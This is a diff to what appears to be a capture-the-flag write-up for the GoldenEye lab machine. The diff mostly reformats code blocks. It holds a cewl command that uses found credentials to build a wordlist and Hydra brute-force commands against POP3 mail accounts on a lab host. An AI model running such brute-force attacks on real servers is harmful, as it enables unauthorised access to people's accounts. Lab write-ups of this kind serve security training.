@@ -33,12 +33,18 @@ Firstly I used the VRFY command on the SMTP server to verify usernames Boris and
 
 Spidering and scraping with cewl
 
-`cewl http://172.16.2.33/sev-home/ --auth_user=boris --auth_pass=InvincibleHack3r --auth_type=basic > /tmp/Goldeneye-WL.txt`
+```
+cewl http://172.16.2.33/sev-home/ --auth_user=boris --auth_pass=InvincibleHack3r --auth_type=basic > /tmp/Goldeneye-WL.txt
+```
 
 Attacking with Hydra
+```
+hydra -e nsr 172.16.2.33 pop3 -l natalya -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V
+```
 
-`hydra -e nsr 172.16.2.33 pop3 -l natalya -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V
+```
 hydra -e nsr 172.16.2.33 pop3 -l boris -P /usr/share/wordlists/fasttrack.txt  -s 55007 -V`
+```
 
 The fasttrack.txt list (not the one generated with Cewl) was sufficient to crack both users mail accounts. 
 
